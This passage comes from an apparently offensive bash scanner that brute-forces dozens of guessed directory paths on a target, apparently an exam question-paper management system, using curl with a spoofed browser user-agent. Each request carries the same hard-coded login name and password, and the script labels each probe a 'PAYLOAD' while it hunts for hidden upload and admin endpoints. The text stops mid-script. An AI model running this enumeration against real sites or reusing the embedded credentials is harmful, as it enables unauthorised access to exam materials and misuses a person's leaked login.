echo -n "Payload [Workflow-QPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-QPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-QPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_Ops/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_Ops/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_Ops/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_FileProcessor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_FileProcessor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_FileProcessor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorTransfer/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorTransfer/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorTransfer/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_BatchUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_BatchUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_BatchUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_DataUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_DataUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_DataUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel-QPMonitor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel-QPMonitor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel-QPMonitor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload-QPMgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload-QPMgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload-QPMgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service_QuestionPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service_QuestionPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service_QuestionPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperManager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperManager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperManager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-QPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-QPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-QPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite-QPDatabase/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite-QPDatabase/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite-QPDatabase/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-Processing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-Processing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-Processing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync_QPMaster/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync_QPMaster/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync_QPMaster/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlDataPipeline/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlDataPipeline/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlDataPipeline/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync-QPBData/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync-QPBData/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync-QPBData/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_QPUploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_QPUploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_QPUploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload-Q_P/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload-Q_P/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload-Q_P/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ModuleQPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ModuleQPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ModuleQPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessorQPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessorQPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessorQPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataDataUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataDataUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataDataUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl-QPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl-QPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl-QPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer-QPProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer-QPProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer-QPProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorProcessingSuite/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorProcessingSuite/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorProcessingSuite/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool_QPDatabase/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool_QPDatabase/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool_QPDatabase/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagerQPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagerQPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagerQPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_BulkUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_BulkUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_BulkUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUploadTestPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUploadTestPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUploadTestPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-ProcessingSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-ProcessingSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-ProcessingSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_UploadService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_UploadService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_UploadService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessingQsnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessingQsnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessingQsnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync-QPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync-QPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync-QPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops_QsnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops_QsnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops_QsnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchCloudSync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchCloudSync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchCloudSync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_Handling/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_Handling/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_Handling/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileBatchUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileBatchUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileBatchUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_Suite/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_Suite/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_Suite/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-Service/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-Service/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-Service/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload-QstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload-QstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload-QstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploaderQPMonitor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploaderQPMonitor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploaderQPMonitor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MgmtQPDatabase/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MgmtQPDatabase/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MgmtQPDatabase/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-Control/]:"
